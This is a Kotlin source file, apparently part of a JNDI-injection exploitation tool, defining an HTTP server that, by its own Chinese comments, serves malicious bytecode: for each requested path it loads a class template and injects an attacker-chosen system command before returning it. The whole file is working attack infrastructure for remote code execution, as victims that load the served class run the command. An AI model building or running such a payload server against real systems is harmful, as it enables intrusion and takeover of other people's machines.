import io.javalin.Javalin
import util.currentTime
import util.insertCommand


/**
 * HTTP服务，提供恶意字节码文件(Codebase)
 * @param port 监听端口
 * @param command 执行的系统命令
 */
class CodeServer(val port: Int, val command: String) {

    fun run() {
        println("${currentTime()} [HTTPSERVER]>> Listening on 0.0.0.0:$port")

        val app = Javalin.create().start(port)
        app.get("/*") { ctx ->
            val uri = ctx.req.requestURI
            println("${currentTime()} [HTTPSERVER]>> Receive a request to $uri")
            ctx.result(getPayload(uri.substring(1)))
        }
    }

    /**
     * 获取写入payload的字节码文件
     * @param fileName 文件名，模板文件在resources目录
     */
    private fun getPayload(fileName: String): ByteArray {
        val tempStream = CodeServer::class.java.getResourceAsStream("template/$fileName")

        return if (tempStream != null) {
            insertCommand(tempStream, command)
        } else {
            println("${currentTime()} [HTTPSERVER]>> File $fileName Not Exist!")
            byteArrayOf()
        }
    }
}
